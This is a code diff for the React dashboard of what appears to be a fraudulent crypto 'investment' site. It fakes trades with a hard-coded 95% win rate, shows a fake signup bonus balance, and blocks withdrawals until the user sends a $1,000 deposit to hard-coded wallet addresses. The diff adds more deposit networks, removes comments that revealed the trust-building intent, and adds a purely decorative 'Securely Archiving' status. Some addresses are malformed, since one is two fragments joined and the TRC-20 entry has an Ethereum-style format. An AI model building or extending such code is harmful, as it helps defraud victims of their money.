@@ -19,6 +19,12 @@ const INVESTMENT_PLANS = [
 
 const PLATFORMS = ['BINANCE', 'BYBIT', 'KRAKEN', 'OKX', 'COINBASE'];
 
+const NETWORKS = [
+  { id: 'trc20', name: 'TRC-20 (Tron)', address: '0x7592766391918c7d3E7F8Ae72D97e98979F25302' },
+  { id: 'erc20', name: 'ERC-20 (Ethereum)', address: '0x91F25302Ae72D97e989797592766391918c7d3E7' },
+  { id: 'bep20', name: 'BNB (BEP-20)', address: '0x2D97e98979F253020x7592766391918c7d3E7F8Ae7' }
+];
+
 const Dashboard: React.FC<DashboardProps> = ({ user: initialUser }) => {
   const [user, setUser] = useState<UserProfile | null>(initialUser);
   const [copied, setCopied] = useState(false);
@@ -35,20 +41,19 @@ const Dashboard: React.FC<DashboardProps> = ({ user: initialUser }) => {
   const [investAmount, setInvestAmount] = useState<number>(1000);
   const [isInvesting, setIsInvesting] = useState(false);
   const [activeTrade, setActiveTrade] = useState<{planName: string, amount: number, progress: number} | null>(null);
-  const [lastSyncStatus, setLastSyncStatus] = useState<'win' | 'loss' | 'neutral'>('neutral');
+  const [isSyncing, setIsSyncing] = useState(false);
   const [withdrawAddress, setWithdrawAddress] = useState('');
   const [showBonus, setShowBonus] = useState(false);
   const [deploymentStep, setDeploymentStep] = useState<number>(-1);
   const fileInputRef = useRef<HTMLInputElement>(null);
-  const walletAddress = "0x7592766391918c7d3E7F8Ae72D97e98979F25302";
+
+  const [depositNetwork, setDepositNetwork] = useState(NETWORKS[0]);
+  const [withdrawNetworkId, setWithdrawNetworkId] = useState('trc20');
 
   useEffect(() => {
     const refreshInterval = setInterval(() => {
       const u = authService.getUser();
       if (u) {
-        const fluctuation = (Math.random() > 0.8) ? (Math.random() * 5) : 0;
-        const status = fluctuation > 0 ? (Math.random() > 0.2 ? 'win' : 'loss') : 'neutral';
-        setLastSyncStatus(status);
         setUser(u);
       }
     }, 5000);
@@ -58,7 +63,6 @@ const Dashboard: React.FC<DashboardProps> = ({ user: initialUser }) => {
   useEffect(() => {
     if (isUnlocked && !aiPulse) {
       fetchPulse();
-      // Show signup bonus message when first entering
       if (!initialUser?.hasDeposited && user?.balance === 1000) {
         setShowBonus(true);
       }
@@ -68,13 +72,10 @@ const Dashboard: React.FC<DashboardProps> = ({ user: initialUser }) => {
   const fetchPulse = async () => {
     setIsAiLoading(true);
     setDeploymentStep(0);
-    
-    // Multi-step splitting animation
     for (let i = 0; i <= PLATFORMS.length; i++) {
       await new Promise(resolve => setTimeout(resolve, 600));
       setDeploymentStep(i + 1);
     }
-
     const pulse = await getInstantMarketPulse("Bitcoin/Ethereum Market");
     if (pulse) setAiPulse(pulse);
     setIsAiLoading(false);
@@ -94,7 +95,7 @@ const Dashboard: React.FC<DashboardProps> = ({ user: initialUser }) => {
   };
 
   const handleCopy = () => {
-    navigator.clipboard.writeText(walletAddress);
+    navigator.clipboard.writeText(depositNetwork.address);
     setCopied(true);
     setTimeout(() => setCopied(false), 2000);
   };
@@ -115,11 +116,15 @@ const Dashboard: React.FC<DashboardProps> = ({ user: initialUser }) => {
         if (result.is_valid && result.detected_amount >= 900) {
           setUploadStatus('success');
           setAuditMessage(`Success! $${result.detected_amount.toLocaleString()} has been added to your account.`);
+          setIsSyncing(true);
           const updated = authService.updateUser({ 
             hasDeposited: true, 
             balance: (authService.getUser()?.balance || 0) + result.detected_amount 
           });
-          if (updated) setUser(updated);
+          if (updated) {
+            setUser(updated);
+            setTimeout(() => setIsSyncing(false), 2000);
+          }
         } else {
           setUploadStatus('failed');
           setAuditMessage(result.summary || "We couldn't verify that. Please upload a clear screenshot of your transfer.");
@@ -133,7 +138,8 @@ const Dashboard: React.FC<DashboardProps> = ({ user: initialUser }) => {
   const handleWithdraw = () => {
     if (!user) return;
     if (!user.hasDeposited) {
-      setWithdrawError("Please make your first deposit of $1,000 to unlock your payouts.");
+      const selectedNet = NETWORKS.find(n => n.id === withdrawNetworkId)?.name || 'TRC-20';
+      setWithdrawError(`Please make your first deposit of $1,000 via ${selectedNet} to unlock your payouts.`);
       return;
     }
     if (!withdrawAddress.trim()) return;
@@ -166,46 +172,47 @@ const Dashboard: React.FC<DashboardProps> = ({ user: initialUser }) => {
     if (updatedUser) setUser(updatedUser);
     
     let progress = 0;
-    // Accelerated trade speed - completes in ~1.5 seconds
     const interval = setInterval(() => {
-      progress += 8; // Increased from 5
+      progress += 8;
       setActiveTrade(prev => prev ? { ...prev, progress } : null);
       if (progress >= 100) {
         clearInterval(interval);
         finalizeTrade(plan, investAmount);
       }
-    }, 120); // Decreased from 200
+    }, 120);
   };
 
   const finalizeTrade = (plan: typeof INVESTMENT_PLANS[0], amount: number) => {
     const u = authService.getUser();
     if (!u) return;
-    
-    // Higher win rate for trust building: 95%
     const isWin = Math.random() < 0.95; 
     const returnPercent = isWin 
       ? (Math.random() * (plan.maxRet - plan.minRet) + plan.minRet) / 100 
-      : -0.05; // Smaller losses
-      
+      : -0.05; 
     const profit = amount * returnPercent;
     const finalAmount = amount + profit;
+    
+    setIsSyncing(true);
     const updatedUser = authService.updateUser({
       balance: u.balance + finalAmount,
       wins: isWin ? (u.wins + 1) : u.wins,
       losses: isWin ? u.losses : (u.losses + 1)
     });
-    if (updatedUser) setUser(updatedUser);
+    
+    if (updatedUser) {
+      setUser(updatedUser);
+      setTimeout(() => setIsSyncing(false), 2000);
+    }
+    
     setIsInvesting(false);
     setActiveTrade(null);
     setSelectedPlanId(null);
-    setLastSyncStatus(isWin ? 'win' : 'loss');
   };
 
   if (!user) return null;
 
   return (
     <div className="bg-[#131722] min-h-screen pt-4 pb-24 px-4 sm:px-6 lg:px-8 overflow-hidden relative">
-      {/* BONUS MODAL */}
       {showBonus && (
         <div className="fixed inset-0 z-[110] flex items-center justify-center p-4 bg-black/90 backdrop-blur-3xl animate-in fade-in duration-500">
            <div className="bg-[#1e222d] border-2 border-[#f01a64] w-full max-w-sm rounded-[3rem] p-8 text-center shadow-[0_0_100px_rgba(240,26,100,0.5)] space-y-6">
@@ -281,11 +288,14 @@ const Dashboard: React.FC<DashboardProps> = ({ user: initialUser }) => {
                 <span className="text-xl sm:text-2xl xl:text-3xl font-black text-red-500">{user.losses}</span>
             </div>
           </div>
-          <div className="bg-[#1e222d] border border-[#2a2e39] p-5 rounded-3xl shadow-xl flex flex-col justify-center text-center overflow-hidden">
-            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1 truncate">Account Level</span>
-            <span className={`text-xs sm:text-sm font-black uppercase tracking-widest truncate ${user.hasDeposited ? 'text-[#00b36b]' : 'text-[#f01a64]'}`}>
-              {user.hasDeposited ? 'Gold Member' : 'New Member'}
-            </span>
+          <div className="bg-[#1e222d] border border-[#2a2e39] p-5 rounded-3xl shadow-xl flex flex-col justify-center text-center overflow-hidden relative">
+            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1 truncate">Cloud Sync Status</span>
+            <div className="flex items-center justify-center gap-2">
+              <div className={`w-1.5 h-1.5 rounded-full ${isSyncing ? 'bg-amber-500 animate-ping' : 'bg-[#00b36b]'}`}></div>
+              <span className={`text-[10px] font-black uppercase tracking-widest truncate ${isSyncing ? 'text-amber-500' : 'text-[#00b36b]'}`}>
+                {isSyncing ? 'Syncing...' : 'Securely Archiving'}
+              </span>
+            </div>
           </div>
         </div>
 
@@ -389,15 +399,32 @@ const Dashboard: React.FC<DashboardProps> = ({ user: initialUser }) => {
               <div className="relative z-10 space-y-6">
                 <h3 className="text-lg font-black text-white uppercase tracking-tighter flex items-center gap-2">
                   <svg className="w-5 h-5 text-[#f01a64]" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M12 4v16m8-8H4"/></svg>
-                  Deposit USDT
+                  Deposit Crypto
                 </h3>
+                
+                <div className="space-y-3">
+                  <label className="text-[8px] font-black text-gray-500 uppercase tracking-widest block">Select Deposit Network</label>
+                  <div className="grid grid-cols-1 gap-2">
+                    {NETWORKS.map(net => (
+                      <button 
+                        key={net.id}
+                        onClick={() => setDepositNetwork(net)}
+                        className={`px-4 py-2 rounded-xl text-[9px] font-black uppercase border transition-all ${depositNetwork.id === net.id ? 'bg-[#f01a64] text-white border-[#f01a64]' : 'bg-[#131722] text-gray-500 border-[#2a2e39] hover:border-[#f01a64]/50'}`}
+                      >
+                        {net.name}
+                      </button>
+                    ))}
+                  </div>
+                </div>
+
                 <div className="bg-[#131722] border border-[#2a2e39] p-4 rounded-2xl overflow-hidden">
-                  <span className="text-[8px] text-gray-500 font-black uppercase mb-1 block tracking-widest truncate">USDT TRC-20 Address</span>
-                  <div className="text-[9px] font-mono text-gray-300 break-all bg-[#1e222d] p-3 rounded-xl border border-[#2a2e39] mb-3 leading-relaxed">{walletAddress}</div>
+                  <span className="text-[8px] text-gray-500 font-black uppercase mb-1 block tracking-widest truncate">{depositNetwork.name} Address</span>
+                  <div className="text-[9px] font-mono text-gray-300 break-all bg-[#1e222d] p-3 rounded-xl border border-[#2a2e39] mb-3 leading-relaxed">{depositNetwork.address}</div>
                   <button onClick={handleCopy} className={`w-full py-3 rounded-xl text-[10px] font-black uppercase transition-all ${copied ? 'bg-[#00b36b] text-white' : 'bg-[#1e222d] text-[#f01a64] border border-pink-500/20'}`}>
                     {copied ? 'COPIED!' : 'COPY ADDRESS'}
                   </button>
                 </div>
+                
                 <div className="space-y-4">
                   <input type="file" ref={fileInputRef} onChange={handleFileChange} accept="image/*" className="hidden" />
                   <button onClick={triggerUpload} disabled={uploadStatus === 'uploading'} className={`w-full py-4 rounded-xl font-black text-[10px] uppercase tracking-[0.2em] shadow-xl transition-all ${uploadStatus === 'success' ? 'bg-[#00b36b] text-white' : uploadStatus === 'failed' ? 'bg-red-500 text-white' : uploadStatus === 'uploading' ? 'bg-gray-700 text-gray-400' : 'bg-[#f01a64] text-white'}`}>
@@ -409,15 +436,31 @@ const Dashboard: React.FC<DashboardProps> = ({ user: initialUser }) => {
             </div>
 
             <div className="bg-[#1e222d] border border-[#2a2e39] p-8 rounded-[2.5rem] shadow-2xl">
-              <h3 className="text-lg font-black text-white uppercase tracking-tighter mb-6">Withdraw Profits</h3>
-              <div className="space-y-4">
-                <div className="space-y-1">
-                  <label className="text-[8px] font-black text-gray-500 uppercase tracking-widest truncate block">Where should we send your money? (TRC-20)</label>
-                  <input type="text" value={withdrawAddress} onChange={(e) => setWithdrawAddress(e.target.value)} placeholder="Enter Wallet Address" className="w-full bg-[#131722] border border-[#2a2e39] rounded-xl px-4 py-3 text-xs text-white font-black focus:outline-none" />
+              <h3 className="text-lg font-black text-white uppercase tracking-tighter mb-6 text-center">Withdrawal Gateway</h3>
+              
+              <div className="space-y-6">
+                <div className="space-y-2">
+                  <label className="text-[8px] font-black text-gray-500 uppercase tracking-widest block">Choose Network</label>
+                  <select 
+                    value={withdrawNetworkId} 
+                    onChange={(e) => setWithdrawNetworkId(e.target.value)}
+                    className="w-full bg-[#131722] border border-[#2a2e39] rounded-xl px-4 py-3 text-xs text-white font-black focus:outline-none appearance-none cursor-pointer"
+                  >
+                    {NETWORKS.map(net => (
+                      <option key={net.id} value={net.id}>{net.name}</option>
+                    ))}
+                  </select>
                 </div>
+
+                <div className="space-y-2">
+                  <label className="text-[8px] font-black text-gray-500 uppercase tracking-widest truncate block">Enter Recipient Address</label>
+                  <input type="text" value={withdrawAddress} onChange={(e) => setWithdrawAddress(e.target.value)} placeholder="Destination Address" className="w-full bg-[#131722] border border-[#2a2e39] rounded-xl px-4 py-3 text-xs text-white font-black focus:outline-none" />
+                </div>
+                
                 {withdrawError && <p className="text-[9px] text-red-500 font-bold uppercase leading-tight">{withdrawError}</p>}
+                
                 <button onClick={handleWithdraw} disabled={withdrawStatus === 'processing' || !withdrawAddress.trim()} className={`w-full py-4 rounded-xl font-black text-[10px] uppercase tracking-[0.2em] transition-all ${withdrawStatus === 'success' ? 'bg-[#00b36b] text-white' : withdrawStatus === 'processing' ? 'bg-gray-700 text-gray-400' : 'bg-white/5 border border-white/10 text-gray-400 hover:text-white'}`}>
-                  {withdrawStatus === 'idle' ? 'SEND MY MONEY' : withdrawStatus === 'processing' ? 'PROCESSING...' : 'SUCCESS'}
+                  {withdrawStatus === 'idle' ? 'AUTHORIZE PAYOUT' : withdrawStatus === 'processing' ? 'PROCESSING...' : 'SUCCESS'}
                 </button>
               </div>
             </div>
